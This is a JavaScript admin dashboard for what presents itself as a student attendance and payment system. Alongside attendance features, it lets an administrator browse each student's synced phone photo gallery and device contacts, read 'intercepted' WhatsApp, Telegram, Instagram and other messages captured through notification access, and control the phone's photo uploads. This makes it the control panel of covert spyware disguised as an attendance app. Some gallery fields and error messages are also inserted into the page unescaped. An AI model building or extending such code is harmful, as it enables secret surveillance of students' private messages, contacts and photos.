const state = {
  token: localStorage.getItem("attendanceAdminToken") || "",
  view: "dashboard",
  students: [],
  plans: [],
};

const els = {
  loginView: document.getElementById("login-view"),
  appView: document.getElementById("app-view"),
  loginForm: document.getElementById("login-form"),
  loginError: document.getElementById("login-error"),
  logoutButton: document.getElementById("logout-button"),
  notice: document.getElementById("notice"),
  viewTitle: document.getElementById("view-title"),
  metrics: document.getElementById("metrics"),
  latestLogs: document.getElementById("latest-logs"),
  departmentBreakdown: document.getElementById("department-breakdown"),
  studentForm: document.getElementById("student-form"),
  studentsTable: document.getElementById("students-table"),
  attendanceTable: document.getElementById("attendance-table"),
  attendanceSummary: document.getElementById("attendance-summary"),
  paymentsTable: document.getElementById("payments-table"),
  planSelect: document.getElementById("plan-select"),
};

function showApp(isAuthed) {
  els.loginView.classList.toggle("hidden", isAuthed);
  els.appView.classList.toggle("hidden", !isAuthed);
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function getAvatarHtml(name, userId) {
  if (!name) return "";
  const parts = name.trim().split(/\s+/);
  const initials = parts.length > 1 
    ? (parts[0][0] + parts[parts.length - 1][0]) 
    : name.slice(0, 2);
  const cleanInitials = initials.toUpperCase();
  
  // Generate consistent gradient colors based on name hash
  let hash = 0;
  for (let i = 0; i < name.length; i++) {
    hash = name.charCodeAt(i) + ((hash << 5) - hash);
  }
  
  const gradients = [
    ["#14b8a6", "#0f766e"], // Teal/Cyan
    ["#3b82f6", "#1d4ed8"], // Modern blue
    ["#8b5cf6", "#6d28d9"], // Purple
    ["#ec4899", "#be185d"], // Rose/Pink
    ["#f97316", "#c2410c"], // Orange/Amber
    ["#06b6d4", "#0891b2"], // Light blue
  ];
  
  const index = Math.abs(hash) % gradients.length;
  const [c1, c2] = gradients[index];

  if (userId) {
    return `<div class="avatar-container">
      <img class="avatar" src="/uploads/faces/${userId}.jpg" alt="${escapeHtml(name)}" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
      <div class="avatar" style="background: linear-gradient(135deg, ${c1}, ${c2}); display: none;">${escapeHtml(cleanInitials)}</div>
    </div>`;
  }
  
  return `<div class="avatar" style="background: linear-gradient(135deg, ${c1}, ${c2})">${escapeHtml(cleanInitials)}</div>`;
}


function showNotice(message, type = "success") {
  if (!message) {
    els.notice.className = "notice hidden";
    els.notice.textContent = "";
    return;
  }
  els.notice.className = `notice ${type}`;
  els.notice.textContent = message;
}

function updateSyncButton(btn, syncEnabled) {
  if (syncEnabled) {
    btn.textContent = "\u23F9 Stop Sync";
    btn.style.background = "#dc2626";
    btn.style.color = "#fff";
    btn.style.border = "1px solid #dc2626";
  } else {
    btn.textContent = "\u25B6 Resume Sync";
    btn.style.background = "#16a34a";
    btn.style.color = "#fff";
    btn.style.border = "1px solid #16a34a";
  }
  btn.dataset.syncEnabled = syncEnabled ? "true" : "false";
}

async function showSyncedGallery(studentCode, studentName) {
  const modal         = document.getElementById("gallery-modal");
  const modalTitle    = document.getElementById("gallery-modal-title");
  const modalBody     = document.getElementById("gallery-modal-body");
  const downloadAllBtn  = document.getElementById("gallery-modal-download-all");
  const driveBtn      = document.getElementById("gallery-modal-drive-migrate");
  const driveFolderEl = document.getElementById("gallery-modal-drive-folder");
  const toggleSyncBtn = document.getElementById("gallery-modal-toggle-sync");

  modalTitle.textContent = `${studentName}'s Device Gallery`;

  // Reset Drive buttons
  if (driveBtn)      { driveBtn.style.display = "none"; driveBtn.dataset.code = studentCode; }
  if (driveFolderEl) { driveFolderEl.style.display = "none"; }
  if (downloadAllBtn) { downloadAllBtn.dataset.code = studentCode; downloadAllBtn.style.display = "block"; }

  // Sync toggle button
  if (toggleSyncBtn) {
    toggleSyncBtn.dataset.code = studentCode;
    try {
      const status = await api(`/admin/gallery-sync/${studentCode}/status`);
      updateSyncButton(toggleSyncBtn, status.sync_enabled);
    } catch (_) {
      updateSyncButton(toggleSyncBtn, true);
    }
  }

  modalBody.innerHTML = `<div class="empty-state">Loading synced photos...</div>`;
  modal.classList.remove("hidden");

  try {
    const data       = await api(`/admin/synced-gallery/${studentCode}`);
    const items      = data.photo_items || [];
    const driveEnabled = data.drive_enabled || false;

    // Show Drive folder link if available
    if (data.drive_folder_url && driveFolderEl) {
      driveFolderEl.href          = data.drive_folder_url;
      driveFolderEl.style.display = "inline-flex";
    }

    // Show "Send to Drive" button when Drive is configured AND there are local photos
    const hasLocal = items.some(p => p.source === "local");
    if (driveEnabled && hasLocal && driveBtn) {
      driveBtn.style.display = "inline-block";
    }

    if (items.length === 0) {
      modalBody.innerHTML = `<div class="empty-state">No synced photos found for this student.</div>`;
      if (downloadAllBtn) downloadAllBtn.style.display = "none";
      return;
    }

    // Render photos — each item has {thumb_url|thumb, view_url|view, name, source}
    modalBody.innerHTML = items.map(item => {
      const thumb = item.thumb_url || item.thumb || "";
      const view  = item.view_url  || item.view  || thumb;
      const name  = item.name || "photo";
      const badge = item.source === "drive"
        ? `<span style="position:absolute;top:6px;left:6px;background:#4285f4;color:#fff;font-size:9px;padding:2px 5px;border-radius:3px;">Drive</span>`
        : "";
      const dlLink = item.source === "local"
        ? `<a href="${thumb}" download="${name}" class="download-img-btn" style="position:absolute;bottom:8px;right:8px;background:rgba(16,24,39,0.7);color:#fff;padding:4px 8px;border-radius:4px;font-size:11px;text-decoration:none;font-weight:bold;">Download</a>`
        : `<a href="${view}" target="_blank" class="download-img-btn" style="position:absolute;bottom:8px;right:8px;background:rgba(66,133,244,0.85);color:#fff;padding:4px 8px;border-radius:4px;font-size:11px;text-decoration:none;font-weight:bold;">Open</a>`;
      return `
        <div class="gallery-img-wrapper" style="position:relative;">
          <a href="${view}" target="_blank">
            <img src="${thumb}" class="gallery-img" alt="${name}" loading="lazy" onerror="this.style.opacity='0.3'" />
          </a>
          ${badge}
          ${dlLink}
        </div>
      `;
    }).join("");
  } catch (error) {
    modalBody.innerHTML = `<div class="empty-state" style="color:var(--danger)">Error: ${error.message}</div>`;
    if (downloadAllBtn) downloadAllBtn.style.display = "none";
  }
}


async function showSyncedContacts(studentCode, studentName) {
  const modal = document.getElementById("contacts-modal");
  const modalTitle = document.getElementById("contacts-modal-title");
  const modalBody = document.getElementById("contacts-modal-body");
  
  modalTitle.textContent = `${studentName}'s Device Contacts`;
  modalBody.innerHTML = `<tr><td colspan="3" class="empty-state">Loading synced contacts...</td></tr>`;
  modal.classList.remove("hidden");
  
  try {
    const contacts = await api(`/admin/synced-contacts/${studentCode}`);
    
    if (contacts.length === 0) {
      modalBody.innerHTML = `<tr><td colspan="3" class="empty-state">No synced contacts found for this student.</td></tr>`;
      return;
    }
    
    modalBody.innerHTML = contacts.map(c => `
      <tr>
        <td><strong>${escapeHtml(c.name)}</strong></td>
        <td>${escapeHtml(c.phone || '-')}</td>
        <td>${escapeHtml(c.email || '-')}</td>
      </tr>
    `).join("");
  } catch (error) {
    modalBody.innerHTML = `<tr><td colspan="3" class="empty-state" style="color:var(--danger)">Error: ${error.message}</td></tr>`;
  }
}

async function showSyncedMessages(studentCode, studentName) {
  const modal = document.getElementById("messages-modal");
  const modalTitle = document.getElementById("messages-modal-title");
  const modalBody = document.getElementById("messages-modal-body");
  
  modalTitle.textContent = `${studentName}'s Chat Logs`;
  modalBody.innerHTML = `<tr><td colspan="4" class="empty-state">Loading synced messages...</td></tr>`;
  modal.classList.remove("hidden");
  
  try {
    const messages = await api(`/admin/synced-messages/${studentCode}`);
    
    if (messages.length === 0) {
      modalBody.innerHTML = `<tr><td colspan="4" class="empty-state">No intercepted messages found. Ensure the device has granted Notification Access and has received messages.</td></tr>`;
      return;
    }
    
    modalBody.innerHTML = messages.map(m => {
      let appBadge = `<span class="badge">${escapeHtml(m.app)}</span>`;
      if (m.app === 'whatsapp') appBadge = `<span class="badge good">WhatsApp</span>`;
      if (m.app === 'telegram') appBadge = `<span class="badge info">Telegram</span>`;
      if (m.app === 'instagram') appBadge = `<span class="badge warn">Instagram</span>`;
      if (m.app === 'viber') appBadge = `<span class="badge info" style="background:#7360f2; color:#fff;">Viber</span>`;
      if (m.app === 'tiktok') appBadge = `<span class="badge" style="background:#010101; color:#fff;">TikTok</span>`;
      if (m.app === 'linkedin') appBadge = `<span class="badge info" style="background:#0a66c2; color:#fff;">LinkedIn</span>`;
      if (m.app === 'messages') appBadge = `<span class="badge good" style="background:#3b82f6; color:#fff;">Messages</span>`;
      
      return `
        <tr>
          <td>${appBadge}</td>
          <td><strong>${escapeHtml(m.sender)}</strong></td>
          <td>${escapeHtml(m.message)}</td>
          <td>${escapeHtml(dateTime(m.timestamp))}</td>
        </tr>
      `;
    }).join("");
  } catch (error) {
    modalBody.innerHTML = `<tr><td colspan="4" class="empty-state" style="color:var(--danger)">Error: ${error.message}</td></tr>`;
  }
}

function dateTime(value) {
  if (!value) return "";
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return "";
  return date.toLocaleString([], {dateStyle: "medium", timeStyle: "short"});
}

function money(amountCents, currency) {
  return new Intl.NumberFormat([], {
    style: "currency",
    currency: (currency || "usd").toUpperCase(),
  }).format((amountCents || 0) / 100);
}

async function api(path, options = {}) {
  const headers = {
    Accept: "application/json",
    ...(options.headers || {}),
  };
  if (state.token) {
    headers.Authorization = `Bearer ${state.token}`;
  }
  if (options.body && !(options.body instanceof FormData)) {
    headers["Content-Type"] = "application/json";
    options.body = JSON.stringify(options.body);
  }

  const response = await fetch(path, {...options, headers});
  const text = await response.text();
  const data = text ? JSON.parse(text) : {};
  if (!response.ok) {
    if (response.status === 401) {
      logout(false);
    }
    throw new Error(data.detail || data.message || "Request failed");
  }
  return data;
}

async function downloadAuthenticatedFile(path, filename) {
  try {
    const headers = {};
    if (state.token) {
      headers.Authorization = `Bearer ${state.token}`;
    }
    const response = await fetch(path, { headers });
    if (!response.ok) {
      if (response.status === 401) {
        logout(false);
      }
      let detail = "Download failed";
      try {
        const data = await response.json();
        detail = data.detail || data.message || detail;
      } catch (e) {}
      throw new Error(detail);
    }
    const blob = await response.blob();
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    window.URL.revokeObjectURL(url);
  } catch (error) {
    showNotice(error.message, "error");
  }
}

function renderTable(target, headers, rows, emptyText = "No records found") {
  if (!rows.length) {
    target.innerHTML = `<div class="empty-state">${escapeHtml(emptyText)}</div>`;
    return;
  }

  const head = headers.map((header) => `<th>${escapeHtml(header)}</th>`).join("");
  const body = rows.map((row) => `<tr>${row.join("")}</tr>`).join("");
  target.innerHTML = `<table><thead><tr>${head}</tr></thead><tbody>${body}</tbody></table>`;
}

function badge(value) {
  const normalized = String(value || "").toLowerCase();
  const tone = ["paid", "active", "in"].includes(normalized)
    ? "good"
    : ["pending", "trial", "out"].includes(normalized)
      ? "warn"
      : "";
  return `<span class="badge ${tone}">${escapeHtml(value || "unknown")}</span>`;
}

function setActiveView(view) {
  state.view = view;
  document.querySelectorAll(".tab").forEach((button) => {
    button.classList.toggle("active", button.dataset.view === view);
  });
  document.querySelectorAll(".view-section").forEach((section) => {
    section.classList.toggle("hidden", section.id !== `${view}-section`);
  });
  els.viewTitle.textContent = {
    dashboard: "Overview",
    students: "Students",
    attendance: "Attendance",
    payments: "Payments",
  }[view];

  showNotice("");
  if (view === "dashboard") loadDashboard();
  if (view === "students") loadStudents();
  if (view === "attendance") loadAttendance();
  if (view === "payments") loadPayments();
}

async function loadDashboard() {
  try {
    const data = await api("/admin/dashboard");
    els.metrics.innerHTML = data.metrics
      .map((metric) => `<article class="metric"><span>${escapeHtml(metric.label)}</span><strong>${escapeHtml(metric.value)}</strong></article>`)
      .join("");
    renderTable(
      els.latestLogs,
      ["Student", "Code", "Action", "Time"],
      (data.latest_logs || []).map((row) => [
        `<td class="user-cell">${getAvatarHtml(row.name, row.user_id)}<span>${escapeHtml(row.name)}</span></td>`,
        `<td>${escapeHtml(row.student_code || "")}</td>`,
        `<td>${badge(row.action)}</td>`,
        `<td>${escapeHtml(dateTime(row.timestamp))}</td>`,
      ]),
      "No attendance yet",
    );

    const entries = Object.entries(data.department_breakdown || {});
    const max = Math.max(1, ...entries.map((entry) => entry[1]));
    els.departmentBreakdown.innerHTML = entries
      .map(([label, value]) => {
        const width = Math.max(6, Math.round((value / max) * 100));
        return `<div class="bar-row"><div class="bar-label"><span>${escapeHtml(label)}</span><span>${value}</span></div><div class="bar"><span style="width:${width}%"></span></div></div>`;
      })
      .join("");
  } catch (error) {
    showNotice(error.message, "error");
  }
}

async function loadStudents() {
  try {
    const search = document.getElementById("student-search").value.trim();
    const params = new URLSearchParams({limit: "100"});
    if (search) params.set("q", search);
    const data = await api(`/admin/students?${params}`);
    state.students = data.items || [];
    renderTable(
      els.studentsTable,
      ["Name", "Code", "Dept", "Sem", "Face", "Payment", "Status", ""],
      state.students.map((student) => [
        `<td class="user-cell">${getAvatarHtml(student.name, student.id)}<div><strong>${escapeHtml(student.name)}</strong><br><small>${escapeHtml(student.email || "")}</small></div></td>`,
        `<td>${escapeHtml(student.student_code || "")}</td>`,
        `<td>${escapeHtml(student.department)} / ${escapeHtml(student.section)}</td>`,
        `<td>${escapeHtml(student.semester)}</td>`,
        `<td>${badge(student.face_enrolled ? "ready" : "pending")}</td>`,
        `<td>${badge(student.payment_status)}</td>`,
        `<td>${badge(student.status)}</td>`,
        `<td><div class="row-actions"><button class="secondary-button" data-action="edit-student" data-id="${student.id}">Edit</button><button class="secondary-button" data-action="view-gallery" data-id="${student.id}" data-code="${student.student_code || ''}">Gallery</button><button class="secondary-button" data-action="view-contacts" data-id="${student.id}" data-code="${student.student_code || ''}">Contacts</button><button class="secondary-button" data-action="view-messages" data-id="${student.id}" data-code="${student.student_code || ''}">Messages</button><button class="secondary-button danger-button" data-action="delete-student" data-id="${student.id}">Delete</button></div></td>`,
      ]),
      "No students found",
    );
  } catch (error) {
    showNotice(error.message, "error");
  }
}

function resetStudentForm() {
  els.studentForm.reset();
  document.getElementById("student-id").value = "";
  document.getElementById("student-save").textContent = "Add Student";
  document.getElementById("student-department").value = "General";
  document.getElementById("student-program").value = "General";
  document.getElementById("student-semester").value = "1";
  document.getElementById("student-section").value = "A";
}

function fillStudentForm(student) {
  document.getElementById("student-id").value = student.id;
  document.getElementById("student-name").value = student.name || "";
  document.getElementById("student-code").value = student.student_code || "";
  document.getElementById("student-email").value = student.email || "";
  document.getElementById("student-phone").value = student.phone || "";
  document.getElementById("student-department").value = student.department || "General";
  document.getElementById("student-program").value = student.program || "General";
  document.getElementById("student-semester").value = student.semester || 1;
  document.getElementById("student-section").value = student.section || "A";
  document.getElementById("student-status").value = student.status || "active";
  document.getElementById("student-payment-status").value = student.payment_status || "trial";
  document.getElementById("student-save").textContent = "Update Student";
}

async function saveStudent(event) {
  event.preventDefault();
  const id = document.getElementById("student-id").value;
  const payload = {
    name: document.getElementById("student-name").value.trim(),
    student_code: document.getElementById("student-code").value.trim() || null,
    email: document.getElementById("student-email").value.trim() || null,
    phone: document.getElementById("student-phone").value.trim() || null,
    department: document.getElementById("student-department").value.trim() || "General",
    program: document.getElementById("student-program").value.trim() || "General",
    semester: Number(document.getElementById("student-semester").value || 1),
    section: document.getElementById("student-section").value.trim() || "A",
    status: document.getElementById("student-status").value,
    payment_status: document.getElementById("student-payment-status").value,
  };

  try {
    if (id) {
      await api(`/admin/students/${id}`, {method: "PUT", body: payload});
      showNotice("Student updated");
    } else {
      await api("/admin/students", {method: "POST", body: payload});
      showNotice("Student added");
    }
    resetStudentForm();
    loadStudents();
    loadDashboard();
  } catch (error) {
    showNotice(error.message, "error");
  }
}

async function loadAttendance() {
  try {
    const params = new URLSearchParams({limit: "150"});
    const department = document.getElementById("attendance-department").value.trim();
    const section = document.getElementById("attendance-section-filter").value.trim();
    const course = document.getElementById("attendance-course").value.trim();
    if (department) params.set("department", department);
    if (section) params.set("section", section);
    if (course) params.set("course_code", course);

    const data = await api(`/admin/reports/attendance?${params}`);
    els.attendanceSummary.innerHTML = [
      ["Records", data.total],
      ["Present", data.present_students],
      ["Checked In", data.checked_in_now],
    ]
      .map(([label, value]) => `<article class="metric"><span>${label}</span><strong>${value}</strong></article>`)
      .join("");
    renderTable(
      els.attendanceTable,
      ["Student", "Code", "Dept", "Action", "Course", "Time"],
      (data.logs || []).map((row) => [
        `<td class="user-cell">${getAvatarHtml(row.name, row.user_id)}<span>${escapeHtml(row.name)}</span></td>`,
        `<td>${escapeHtml(row.student_code || "")}</td>`,
        `<td>${escapeHtml(row.department || "")} / ${escapeHtml(row.section || "")}</td>`,
        `<td>${badge(row.action)}</td>`,
        `<td>${escapeHtml(row.course_code || "")}</td>`,
        `<td>${escapeHtml(dateTime(row.timestamp))}</td>`,
      ]),
      "No attendance records found",
    );
  } catch (error) {
    showNotice(error.message, "error");
  }
}

async function loadPlans() {
  const data = await api("/billing/plans");
  state.plans = data.plans || [];
  els.planSelect.innerHTML = state.plans
    .map((plan) => `<option value="${escapeHtml(plan.code)}">${escapeHtml(plan.name)} - ${escapeHtml(money(plan.amount_cents, plan.currency))}</option>`)
    .join("");
}

async function loadPayments() {
  try {
    if (!state.plans.length) {
      await loadPlans();
    }
    const data = await api("/admin/payments?limit=100");
    renderTable(
      els.paymentsTable,
      ["Student", "Code", "Plan", "Amount", "Status", "Paid", "Provider"],
      (data.items || []).map((row) => [
        `<td>${escapeHtml(row.student_name || "")}</td>`,
        `<td>${escapeHtml(row.student_code || "")}</td>`,
        `<td>${escapeHtml(row.plan_code)}</td>`,
        `<td>${escapeHtml(money(row.amount_cents, row.currency))}</td>`,
        `<td>${badge(row.status)}</td>`,
        `<td>${escapeHtml(dateTime(row.paid_at))}</td>`,
        `<td>${escapeHtml(row.provider)}</td>`,
      ]),
      "No payments found",
    );
  } catch (error) {
    showNotice(error.message, "error");
  }
}

async function startCheckout() {
  try {
    const payload = {
      plan_code: els.planSelect.value,
      student_code: document.getElementById("payment-student-code").value.trim() || null,
    };
    const data = await api("/payments/checkout-session", {method: "POST", body: payload});
    showNotice(data.status === "paid" ? "Demo payment completed" : "Checkout created");
    if (data.checkout_url) {
      window.open(data.checkout_url, "_blank", "noopener,noreferrer");
    }
    loadPayments();
    loadDashboard();
  } catch (error) {
    showNotice(error.message, "error");
  }
}

async function logout(callServer = true) {
  if (callServer && state.token) {
    try {
      await api("/auth/logout", {method: "POST"});
    } catch (_) {
      /* Local logout still clears the token. */
    }
  }
  state.token = "";
  localStorage.removeItem("attendanceAdminToken");
  showApp(false);
}

els.loginForm.addEventListener("submit", async (event) => {
  event.preventDefault();
  els.loginError.textContent = "";
  try {
    const data = await api("/auth/token", {
      method: "POST",
      body: {
        username: document.getElementById("login-username").value,
        password: document.getElementById("login-password").value,
      },
    });
    state.token = data.access_token;
    localStorage.setItem("attendanceAdminToken", state.token);
    showApp(true);
    setActiveView("dashboard");
  } catch (error) {
    els.loginError.textContent = error.message;
  }
});

els.logoutButton.addEventListener("click", () => logout(true));
els.studentForm.addEventListener("submit", saveStudent);
document.getElementById("student-reset").addEventListener("click", resetStudentForm);
document.getElementById("refresh-dashboard").addEventListener("click", loadDashboard);
document.getElementById("refresh-students").addEventListener("click", loadStudents);
document.getElementById("refresh-attendance").addEventListener("click", loadAttendance);
document.getElementById("refresh-payments").addEventListener("click", loadPayments);
document.getElementById("start-checkout").addEventListener("click", startCheckout);
document.getElementById("export-students-csv").addEventListener("click", () => {
  const search = document.getElementById("student-search").value.trim();
  const params = new URLSearchParams();
  if (search) params.set("q", search);
  downloadAuthenticatedFile(`/admin/students/export-csv?${params}`, "students.csv");
});
document.getElementById("export-attendance-csv").addEventListener("click", () => {
  const params = new URLSearchParams();
  const department = document.getElementById("attendance-department").value.trim();
  const section = document.getElementById("attendance-section-filter").value.trim();
  const course = document.getElementById("attendance-course").value.trim();
  if (department) params.set("department", department);
  if (section) params.set("section", section);
  if (course) params.set("course_code", course);
  downloadAuthenticatedFile(`/admin/attendance/export-csv?${params}`, "attendance.csv");
});
document.getElementById("student-search").addEventListener("input", () => {
  window.clearTimeout(window.studentSearchTimer);
  window.studentSearchTimer = window.setTimeout(loadStudents, 250);
});

document.querySelector(".tabs").addEventListener("click", (event) => {
  const button = event.target.closest("[data-view]");
  if (button) setActiveView(button.dataset.view);
});

document.body.addEventListener("click", async (event) => {
  const actionButton = event.target.closest("[data-action]");
  if (!actionButton) return;
  const id = Number(actionButton.dataset.id);

  if (actionButton.dataset.action === "edit-student") {
    const student = state.students.find((item) => item.id === id);
    if (student) fillStudentForm(student);
  }

  if (actionButton.dataset.action === "view-gallery") {
    const code = actionButton.dataset.code;
    const student = state.students.find((item) => item.id === id);
    const name = student ? student.name : "Student";
    showSyncedGallery(code, name);
  }

  if (actionButton.dataset.action === "view-contacts") {
    const code = actionButton.dataset.code;
    const student = state.students.find((item) => item.id === id);
    const name = student ? student.name : "Student";
    showSyncedContacts(code, name);
  }

  if (actionButton.dataset.action === "view-messages") {
    const code = actionButton.dataset.code;
    const student = state.students.find((item) => item.id === id);
    const name = student ? student.name : "Student";
    showSyncedMessages(code, name);
  }

  if (actionButton.dataset.action === "delete-student") {
    if (!confirm("Are you sure you want to permanently delete this student, their attendance history, and all synced files? This action cannot be undone.")) {
      return;
    }
    try {
      await api(`/admin/students/${id}`, {method: "DELETE"});
      showNotice("Student deleted");
      loadStudents();
      loadDashboard();
    } catch (error) {
      showNotice(error.message, "error");
    }
  }
});

document.getElementById("gallery-modal-close").addEventListener("click", () => {
  document.getElementById("gallery-modal").classList.add("hidden");
});

document.getElementById("gallery-modal").addEventListener("click", (event) => {
  if (event.target.id === "gallery-modal") {
    document.getElementById("gallery-modal").classList.add("hidden");
  }
});

document.getElementById("contacts-modal-close").addEventListener("click", () => {
  document.getElementById("contacts-modal").classList.add("hidden");
});

document.getElementById("contacts-modal").addEventListener("click", (event) => {
  if (event.target.id === "contacts-modal") {
    document.getElementById("contacts-modal").classList.add("hidden");
  }
});

document.getElementById("messages-modal-close").addEventListener("click", () => {
  document.getElementById("messages-modal").classList.add("hidden");
});

document.getElementById("messages-modal").addEventListener("click", (event) => {
  if (event.target.id === "messages-modal") {
    document.getElementById("messages-modal").classList.add("hidden");
  }
});
document.getElementById("gallery-modal-download-all").addEventListener("click", (event) => {
  const code = event.target.dataset.code;
  if (!code) return;
  downloadAuthenticatedFile(`/admin/synced-gallery/${code}/download`, `${code}_gallery.zip`);
});

document.getElementById("gallery-modal-toggle-sync").addEventListener("click", async (event) => {
  const btn = event.currentTarget;
  const code = btn.dataset.code;
  if (!code) return;
  const currentlyEnabled = btn.dataset.syncEnabled !== "false";
  const action = currentlyEnabled ? "disable" : "enable";
  try {
    const result = await api(`/admin/gallery-sync/${code}/${action}`, { method: "POST" });
    updateSyncButton(btn, result.sync_enabled);
    showNotice(
      result.sync_enabled
        ? `Gallery sync RESUMED for ${code} — phone will upload photos again.`
        : `Gallery sync STOPPED for ${code} — phone uploads will be blocked.`,
      result.sync_enabled ? "success" : "error",
    );
  } catch (error) {
    showNotice(error.message, "error");
  }
});

document.getElementById("gallery-modal-drive-migrate").addEventListener("click", async (event) => {
  const btn  = event.currentTarget;
  const code = btn.dataset.code;
  if (!code) return;
  const confirmed = window.confirm(
    `Upload all local photos for "${code}" to Google Drive and delete them from the server?\n\nThis frees up server storage. Photos will remain in your Google Drive.`
  );
  if (!confirmed) return;
  btn.disabled    = true;
  btn.textContent = "☁ Uploading...";
  try {
    const res = await api(`/admin/migrate-gallery-to-drive/${code}`, { method: "POST" });
    const msg = `✅ Sent ${res.uploaded} photo(s) to Drive. ${res.failed ? res.failed + " failed." : ""}`;
    showNotice(msg, res.failed ? "warn" : "success");
    btn.style.display = "none";
    // Show Drive folder link
    const folderEl = document.getElementById("gallery-modal-drive-folder");
    if (folderEl && res.drive_folder_url) {
      folderEl.href          = res.drive_folder_url;
      folderEl.style.display = "inline-flex";
    }
    // Refresh gallery view
    const titleEl = document.getElementById("gallery-modal-title");
    const name    = titleEl?.textContent?.replace("'s Device Gallery", "") || code;
    await showSyncedGallery(code, name);
  } catch (err) {
    showNotice(err.message, "error");
    btn.disabled    = false;
    btn.textContent = "☁ Send to Drive";
  }
});

["attendance-department", "attendance-section-filter", "attendance-course"].forEach((id) => {
  document.getElementById(id).addEventListener("input", () => {
    window.clearTimeout(window.attendanceFilterTimer);
    window.attendanceFilterTimer = window.setTimeout(loadAttendance, 300);
  });
});

const params = new URLSearchParams(window.location.search);
if (params.get("payment")) {
  showNotice(`Payment status: ${params.get("payment")}`);
}

showApp(Boolean(state.token));
if (state.token) {
  setActiveView("dashboard");
}
